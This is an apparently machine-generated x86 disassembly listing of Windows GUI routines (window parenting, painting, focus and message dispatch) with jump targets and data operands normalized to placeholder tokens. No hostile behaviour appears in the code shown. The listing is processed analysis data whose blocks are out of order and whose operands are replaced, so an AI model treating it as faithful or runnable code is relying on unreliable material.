inc ebx
xor esi esi
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov al [ r-xdata ]
cmp al [ edi + 0x61 ]
jne r-xdata
inc esi
dec ebx
jne r-xdata
mov al [ r-xdata ]
cmp al [ edi + 0x61 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x198 ]
mov edx esi
call sub_417e94
mov edi eax
cmp [ edi + 0x5b ] 0x0
jne r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x19c ]
mov edx esi
call sub_417e94
mov edi eax
cmp [ edi + 0x5b ] 0x0
jne r-xdata
sub_44370c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_4410d0
mov eax [ ebp - 0x8 ]
push eax
push sub_443594
mov eax [ ebp - 0x8 ]
push eax
push sub_4435cc
push ebp
call sub_443634
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_443768
push ebx
push esi
push edi
mov ebx eax
mov eax ebx
call sub_43fb24
mov esi eax
cmp esi 0x1
jge r-xdata
lea eax [ esi + 0x1 ]
call sub_408c3c
mov edi eax
mov [ ebx + 0x64 ] edi
mov eax edi
call sub_408c50
mov ecx eax
mov edx edi
mov eax ebx
call sub_43fb34
mov eax r-xdata
call sub_408c5c
mov [ ebx + 0x64 ] eax
jmp r-xdata
call sub_43e5d8
mov eax ebx
mov edx [ eax ]
call [ edx + 0xac ]
pop edi
pop esi
pop ebx
retn
sub_4437c0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
or [ eax + 0x54 ] 0x200
xor eax eax
push ebp
push sub_44380d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x180 ]
push eax
call DestroyWindow
test eax eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_443814
mov eax [ ebp - 0x4 ]
and [ eax + 0x54 ] 0xfdff
retn
call sub_40ce50
sub_443824
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov eax [ edi + 0x19c ]
mov edx ebx
call sub_417ef0
mov esi eax
inc esi
mov eax [ edi + 0x19c ]
mov ebx [ eax + 0x8 ]
dec ebx
sub ebx esi
jl r-xdata
xor eax eax
inc ebx
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov eax [ edi + 0x19c ]
mov edx esi
call sub_417e94
mov eax [ eax + 0x180 ]
test eax eax
jne r-xdata
sub_44386c
push ebx
push esi
push edi
mov ebx eax
cmp [ ebx + 0x180 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xa0 ]
mov esi ebx
push esi
movzx eax [ rw-data ]
push eax
mov eax [ ebx + 0x180 ]
push eax
call SetPropA
push esi
movzx eax [ rw-data ]
push eax
mov eax [ ebx + 0x180 ]
push eax
call SetPropA
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
mov eax ebx
call sub_4430fc
mov esi eax
dec esi
test esi esi
jl r-xdata
push 0x13
push 0x0
push 0x0
push 0x0
push 0x0
mov edx ebx
mov eax esi
call sub_443824
push eax
mov eax [ ebx + 0x180 ]
push eax
call SetWindowPos
inc esi
xor edi edi
mov edx edi
mov eax ebx
call sub_4430c0
call sub_43f204
inc edi
dec esi
jne r-xdata
sub_443908
push ebp
mov ebp esp
add esp 0xfffffff0
push esi
push edi
mov esi [ ebp + 0x8 ]
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x14
sub_443924
push ebx
push esi
push edi
mov ebx eax
cmp [ ebx + 0x180 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x19c ]
test eax eax
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xb0 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov edx edi
mov eax [ ebx + 0x19c ]
call sub_417e94
call sub_443924
inc edi
dec esi
jne r-xdata
sub_443984
push ebx
push esi
push edi
mov edi eax
mov eax edi
mov si 0xffb5
call sub_403368
mov ebx eax
mov eax edi
call sub_443924
mov eax edi
call sub_443ac0
test bl bl
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ edi + 0x180 ] 0x0
je r-xdata
mov eax [ edi + 0x180 ]
push eax
call SetFocus
sub_4439c4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x54 ] 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
mov al 0x1
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x51 ] 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x180 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x180 ] 0x0
jne r-xdata
mov [ ebp - 0x5 ] al
cmp [ ebp - 0x5 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x1a6 ]
cmp al [ ebp - 0x5 ]
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x19c ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x94 ]
mov eax [ ebp - 0x4 ]
mov dl [ ebp - 0x5 ]
mov [ eax + 0x1a6 ] dl
xor eax eax
push ebp
push sub_443a9a
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
xor ecx ecx
mov edx 0xb019
mov eax [ ebp - 0x4 ]
call sub_440d98
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x19c ]
mov edx esi
call sub_417e94
call sub_4439c4
inc esi
dec ebx
jne r-xdata
sub_443ac0
push ebx
push esi
mov esi eax
mov ebx esi
jmp r-xdata
mov eax [ ebx + 0x30 ]
test eax eax
jne r-xdata
mov ebx eax
cmp [ ebx + 0x1a6 ] 0x0
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4032f8
test al al
jne r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4439c4
cmp [ ebx + 0x190 ] 0x0
je r-xdata
sub_443b00
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
cmp esi [ ebx + 0x190 ]
je r-xdata
cmp [ ebx + 0x180 ] 0x0
je r-xdata
mov eax ebx
call sub_443924
mov [ ebx + 0x190 ] esi
cmp [ ebx + 0x190 ] 0x0
je r-xdata
test esi esi
je r-xdata
mov [ ebx + 0x190 ] esi
push esi
mov eax [ ebx + 0x180 ]
push eax
call SetParent
mov eax [ rw-data ]
cmp [ eax ] 0x5
jl r-xdata
mov eax ebx
call sub_443ac0
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
push 0x0
mov dx 0x3
mov ax 0x3
call sub_406d04
mov ecx eax
mov edx 0x127
mov eax ebx
call sub_440d98
jmp r-xdata
sub_443b88
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_443be0
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_443bcf
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x4 ]
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_443bd6
call sub_43e5d8
call sub_425b38
retn
sub_443c00
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov ebx eax
lea ecx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov edx [ edx + 0x4 ]
sub edx [ ebx + 0x44 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax ]
sub eax [ ebx + 0x40 ]
call sub_416a38
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x8 ]
mov [ eax - 0xc ] edx
mov edx [ ebp - 0x4 ]
mov [ eax - 0x8 ] edx
mov eax [ ebp + 0x8 ]
push [ eax - 0x8 ]
push [ eax - 0xc ]
lea edx [ ebp - 0x18 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ ebp - 0x18 ]
push eax
call PtInRect
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
test al al
je r-xdata
cmp [ ebx + 0x57 ] 0x0
je r-xdata
cmp [ ebx + 0x57 ] 0x0
jne r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov [ edx - 0x14 ] ebx
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
mov al 0x1
test [ ebx + 0x51 ] 0x4
je r-xdata
mov eax [ ebp + 0x8 ]
add eax 0xfffffff4
call sub_406cec
push eax
xor ecx ecx
mov edx 0xb00a
mov eax ebx
call sub_440d98
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0xd ] 0x0
je r-xdata
sub_443cb8
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
mov [ ebp - 0xd ] cl
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
mov [ ebp - 0x14 ] eax
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax [ esi + 0x198 ]
test eax eax
je r-xdata
cmp [ esi + 0x19c ] 0x0
je r-xdata
mov eax [ ebp - 0x14 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
mov eax [ esi + 0x19c ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
push ebp
mov edx ebx
mov eax [ esi + 0x19c ]
call sub_417e94
call sub_443c00
pop ecx
test al al
jne r-xdata
push ebp
mov edx ebx
mov eax [ esi + 0x198 ]
call sub_417e94
call sub_443c00
pop ecx
test al al
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_443d4c
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov eax ebx
call sub_446450
mov edi eax
call GetCapture
cmp edi eax
jne r-xdata
push 0x0
lea edx [ esp + 0xc ]
mov eax [ esi + 0x8 ]
call sub_406cd8
lea edx [ esp + 0xc ]
xor ecx ecx
mov eax ebx
call sub_443cb8
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
movsx eax [ esi + 0x8 ]
sub eax [ ebx + 0x40 ]
mov [ esp ] eax
movsx eax [ esi + 0xa ]
sub eax [ ebx + 0x44 ]
mov [ esp + 0x4 ] eax
mov eax esp
call sub_406cec
push eax
mov ecx [ esi + 0x4 ]
mov edx [ esi ]
mov eax ebx
call sub_440d98
mov [ esi + 0xc ] eax
mov al 0x1
xor ebx ebx
jmp r-xdata
mov eax [ rw-data ]
cmp ebx [ eax + 0x30 ]
jne r-xdata
xor eax eax
test ebx ebx
je r-xdata
mov ebx [ rw-data ]
jmp r-xdata
sub_443de0
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov eax [ esi ]
cmp eax 0x84
jg r-xdata
add eax 0xffffff00
sub eax 0x9
jb r-xdata
je r-xdata
mov eax ebx
call sub_440354
test al al
jne r-xdata
add eax 0xffffff09
sub eax 0xb
jb r-xdata
mov edx esi
mov eax ebx
call sub_440e64
cmp [ esi + 0xc ] 0xffffffff
jne r-xdata
sub eax 0x7
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
jmp r-xdata
mov edx esi
mov eax ebx
call sub_443d4c
test al al
je r-xdata
jmp r-xdata
push 0x0
lea edx [ esp + 0xc ]
mov eax [ esi + 0x8 ]
call sub_406cd8
lea edx [ esp + 0xc ]
lea ecx [ esp + 0x4 ]
mov eax ebx
call sub_43f6f4
lea edx [ esp + 0x4 ]
xor ecx ecx
mov eax ebx
call sub_443cb8
test eax eax
je r-xdata
mov eax ebx
call sub_457570
mov edi eax
test edi edi
je r-xdata
dec eax
je r-xdata
mov edx esi
mov eax ebx
call sub_440e64
cmp [ esi + 0xc ] 0x0
jne r-xdata
mov [ esi + 0xc ] 0x1
jmp r-xdata
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0xe8 ]
test al al
je r-xdata
test [ ebx + 0x54 ] 0x20
jne r-xdata
sub eax 0x17
je r-xdata
mov eax ebx
call sub_446754
test al al
je r-xdata
jmp r-xdata
jmp r-xdata
mov eax ebx
call sub_446450
mov edi eax
call GetCapture
cmp edi eax
jne r-xdata
jmp r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
mov eax ebx
call sub_446450
push eax
call DefWindowProcA
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
cmp ebx [ eax + 0x30 ]
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0x1f
mov eax [ rw-data ]
call sub_440d98
sub_443f44
push ebx
push esi
push edi
push ebp
mov ebx edx
mov esi eax
cmp [ esi + 0x180 ] 0x0
je r-xdata
mov edx ebx
mov eax esi
call sub_440ff8
mov edi [ ebx ]
cmp edi 0x7b
jne r-xdata
mov edi [ ebx ]
mov eax edi
add eax 0xfffffece
sub eax 0x7
jb r-xdata
cmp [ esi + 0x30 ] 0x0
je r-xdata
mov ebp [ ebx + 0x8 ]
push ebp
mov eax [ ebx + 0x4 ]
push eax
add edi 0xbc00
push edi
push ebp
call SendMessageA
mov [ ebx + 0xc ] eax
jmp r-xdata
add eax 0xffff4407
sub eax 0x7
jb r-xdata
mov eax [ ebx + 0x8 ]
push eax
mov ecx [ ebx + 0x4 ]
mov edx edi
mov eax [ esi + 0x30 ]
call sub_440d98
mov ebp eax
mov [ ebx + 0xc ] ebp
test ebp ebp
jne r-xdata
mov eax [ ebx ]
cmp eax 0xc
jne r-xdata
mov eax [ esi + 0x68 ]
mov eax [ eax + 0x18 ]
call sub_42154c
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetTextColor
mov eax [ esi + 0x170 ]
call sub_4221f0
call sub_42154c
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetBkColor
mov eax [ esi + 0x170 ]
call sub_42222c
mov [ ebx + 0xc ] eax
jmp r-xdata
jmp r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx [ ebx + 0x8 ]
push edx
mov ecx [ ebx + 0x4 ]
mov edx eax
mov eax esi
call sub_43f750
jmp r-xdata
cmp edi [ rw-data ]
jne r-xdata
mov eax [ ebx + 0x8 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
push edi
mov eax [ esi + 0x180 ]
push eax
mov eax [ esi + 0x174 ]
push eax
call CallWindowProcA
mov [ ebx + 0xc ] eax
mov [ ebx + 0xc ] esi
jmp r-xdata
sub_44404c
push ebx
push esi
push edi
mov esi edx
xor ebx ebx
call sub_43ca3c
mov edi eax
test edi edi
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax [ esi + 0x8 ]
push eax
mov ecx [ esi + 0x4 ]
mov edx [ esi ]
add edx 0xbc00
mov eax edi
call sub_440d98
mov [ esi + 0xc ] eax
mov bl 0x1
sub_444080
push ebp
mov ebp esp
add esp 0xffffffb0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp - 0x8 ]
mov ebx [ ebx + 0x4 ]
test ebx ebx
jne r-xdata
xor edx edx
push ebp
push sub_4441a0
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x198 ] 0x0
jne r-xdata
lea eax [ ebp - 0x50 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_446450
push eax
call BeginPaint
mov ebx eax
push ebx
call SaveDC
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0x2
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x198 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xb8 ]
jmp r-xdata
cmp [ ebp - 0xc ] 0x1
je r-xdata
inc edi
xor esi esi
xor ecx ecx
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4441d8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4441a7
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov eax [ ebp - 0x10 ]
push eax
push ebx
call RestoreDC
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xb8 ]
test [ eax + 0x50 ] 0x40
je r-xdata
test [ eax + 0x1c ] 0x10
je r-xdata
retn
lea eax [ ebp - 0x50 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_446450
push eax
call EndPaint
inc esi
dec edi
jne r-xdata
mov edx [ eax + 0x44 ]
add edx [ eax + 0x4c ]
push edx
mov edx [ eax + 0x40 ]
add edx [ eax + 0x48 ]
push edx
mov edx [ eax + 0x44 ]
push edx
mov eax [ eax + 0x40 ]
push eax
push ebx
call ExcludeClipRect
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x1
je r-xdata
test [ eax + 0x51 ] 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x198 ]
mov edx esi
call sub_417e94
cmp [ eax + 0x57 ] 0x0
jne r-xdata
sub_4441d8
push ebx
push esi
push edi
push ebp
add esp 0xffffffe0
mov ebx ecx
mov ebp edx
mov esi eax
cmp [ esi + 0x1a8 ] 0x0
je r-xdata
mov eax [ esi + 0x198 ]
test eax eax
je r-xdata
cmp [ esi + 0x1a7 ] 0x0
je r-xdata
mov eax [ esi + 0x19c ]
test eax eax
je r-xdata
xor edi edi
test ebx ebx
je r-xdata
cmp [ esi + 0x17c ] 0x0
je r-xdata
add esp 0x20
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
mov eax [ esi + 0x198 ]
mov eax [ eax + 0x8 ]
mov [ esp ] eax
cmp edi [ esp ]
jge r-xdata
mov edx ebx
call sub_417ef0
mov edi eax
test edi edi
jge r-xdata
mov eax [ esi + 0x17c ]
mov edx ebp
mov ecx [ eax ]
call [ ecx + 0x20 ]
inc eax
mov [ esp + 0xc ] eax
xor edi edi
mov eax [ esi + 0x198 ]
mov edx edi
call sub_417e94
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
jne r-xdata
xor edi edi
inc edi
dec [ esp + 0xc ]
jne r-xdata
test [ ebx + 0x50 ] 0x10
je r-xdata
mov eax [ ebx + 0x44 ]
add eax [ ebx + 0x4c ]
push eax
lea eax [ esp + 0x14 ]
push eax
mov ecx [ ebx + 0x40 ]
add ecx [ ebx + 0x48 ]
mov edx [ ebx + 0x44 ]
mov eax [ ebx + 0x40 ]
call sub_416a60
lea eax [ esp + 0x10 ]
push eax
push ebp
call RectVisible
test eax eax
je r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
mov eax [ esi + 0x19c ]
mov edx edi
call sub_417e94
mov ebx eax
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
cmp [ ebx + 0x57 ] 0x0
jne r-xdata
inc edi
cmp edi [ esp ]
jl r-xdata
test [ esi + 0x54 ] 0x80
je r-xdata
test [ ebx + 0x51 ] 0x4
jne r-xdata
mov eax 0xff000010
call sub_42154c
push eax
call CreateSolidBrush
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x8 ]
push eax
mov eax [ ebx + 0x44 ]
add eax [ ebx + 0x4c ]
push eax
lea eax [ esp + 0x18 ]
push eax
mov ecx [ ebx + 0x40 ]
add ecx [ ebx + 0x48 ]
mov edx [ ebx + 0x44 ]
dec edx
mov eax [ ebx + 0x40 ]
dec eax
call sub_416a60
lea eax [ esp + 0x14 ]
push eax
push ebp
call FrameRect
mov eax [ esp + 0x8 ]
push eax
call DeleteObject
mov eax 0xff000014
call sub_42154c
push eax
call CreateSolidBrush
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x8 ]
push eax
mov eax [ ebx + 0x44 ]
add eax [ ebx + 0x4c ]
inc eax
push eax
lea eax [ esp + 0x18 ]
push eax
mov ecx [ ebx + 0x40 ]
add ecx [ ebx + 0x48 ]
inc ecx
mov edx [ ebx + 0x44 ]
mov eax [ ebx + 0x40 ]
call sub_416a60
lea eax [ esp + 0x14 ]
push eax
push ebp
call FrameRect
mov eax [ esp + 0x8 ]
push eax
call DeleteObject
test [ ebx + 0x1c ] 0x10
je r-xdata
push ebp
call SaveDC
mov [ esp + 0x4 ] eax
mov ecx [ ebx + 0x44 ]
mov edx [ ebx + 0x40 ]
mov eax ebp
call sub_43e4ec
mov eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x48 ]
push eax
push 0x0
push 0x0
push ebp
call IntersectClipRect
push 0x0
mov ecx ebp
mov edx 0xf
mov eax ebx
call sub_440d98
mov eax [ esp + 0x4 ]
push eax
push ebp
call RestoreDC
and [ ebx + 0x54 ] 0xff7f
or [ ebx + 0x54 ] 0x80
test [ ebx + 0x51 ] 0x4
jne r-xdata
sub_444408
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
or [ ebx + 0x54 ] 0x80
push esi
call SaveDC
mov [ ebp - 0xc ] eax
mov ecx [ ebp + 0x8 ]
mov edx edi
mov eax esi
call sub_43e4ec
mov eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x48 ]
push eax
push 0x0
push 0x0
push esi
call IntersectClipRect
xor edi edi
xor eax eax
mov [ ebp - 0x8 ] eax
push 0xffffffec
mov eax ebx
call sub_446450
push eax
call GetWindowLongA
test ah 0x2
je r-xdata
push 0xfffffff0
mov eax ebx
call sub_446450
push eax
call GetWindowLongA
test eax 0x800000
je r-xdata
mov [ ebp - 0x8 ] 0xa
mov edi 0x200f
jmp r-xdata
test edi edi
je r-xdata
mov [ ebp - 0x8 ] 0x3
mov edi 0xa00f
push 0x0
mov ecx esi
mov edx 0x14
mov eax ebx
call sub_440d98
push 0x0
mov ecx esi
mov edx 0xf
mov eax ebx
call sub_440d98
mov eax [ ebx + 0x19c ]
test eax eax
je r-xdata
mov eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x48 ]
push eax
push 0x0
push 0x0
lea eax [ ebp - 0x20 ]
push eax
call SetRect
push edi
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x20 ]
push eax
push esi
call DrawEdge
mov ecx [ ebp - 0x1c ]
mov edx [ ebp - 0x20 ]
mov eax esi
call sub_43e4ec
mov eax [ ebp - 0x14 ]
sub eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x18 ]
sub eax [ ebp - 0x20 ]
push eax
push 0x0
push 0x0
push esi
call IntersectClipRect
mov eax [ ebp - 0xc ]
push eax
push esi
call RestoreDC
and [ ebx + 0x54 ] 0xff7f
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] 0x0
inc [ ebp - 0x4 ]
dec [ ebp - 0x10 ]
jne r-xdata
mov edx [ eax + 0x44 ]
push edx
mov ecx [ eax + 0x40 ]
mov edx esi
call sub_444408
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x19c ]
call sub_417e94
cmp [ eax + 0x57 ] 0x0
je r-xdata
sub_44455c
push ebp
mov ebp esp
add esp 0xffffff94
push ebx
push esi
push edi
mov esi edx
mov ebx eax
cmp [ ebx + 0x1f8 ] 0x0
je r-xdata
test [ ebx + 0x55 ] 0x1
jne r-xdata
cmp [ esi + 0x4 ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_444080
jmp r-xdata
mov eax ebx
call sub_4430fc
test eax eax
jne r-xdata
push 0x0
call GetDC
mov edi eax
lea edx [ ebp - 0x5c ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x50 ]
push eax
lea edx [ ebp - 0x6c ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x64 ]
push eax
push edi
call CreateCompatibleBitmap
mov [ ebp - 0x8 ] eax
push edi
push 0x0
call ReleaseDC
push 0x0
call CreateCompatibleDC
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call SelectObject
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_4446ae
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4c ]
push eax
mov eax ebx
call sub_446450
push eax
call BeginPaint
mov edi eax
mov eax [ ebp - 0x4 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx 0x14
mov eax ebx
call sub_440d98
mov eax [ ebp - 0x4 ]
mov [ esi + 0x4 ] eax
mov edx esi
mov eax ebx
call sub_44455c
xor eax eax
mov [ esi + 0x4 ] eax
push 0xcc0020
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x5c ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x50 ]
push eax
lea edx [ ebp - 0x6c ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x64 ]
push eax
push 0x0
push 0x0
push edi
call BitBlt
lea eax [ ebp - 0x4c ]
push eax
mov eax ebx
call sub_446450
push eax
call EndPaint
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call SelectObject
mov eax [ ebp - 0x4 ]
push eax
call DeleteDC
mov eax [ ebp - 0x8 ]
push eax
call DeleteObject
retn
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
jmp r-xdata
sub_4446bc
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_44404c
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_4446dc
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
call sub_44404c
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_444750
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_44404c
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_444770
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_44404c
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_444790
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
mov eax [ eax + 0x4 ]
call sub_44404c
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_4447b4
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
mov eax [ eax + 0x4 ]
call sub_44404c
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_4447d8
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
mov eax [ eax + 0x4 ]
call sub_44404c
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_4447fc
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
mov eax [ eax + 0x4 ]
call sub_44404c
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
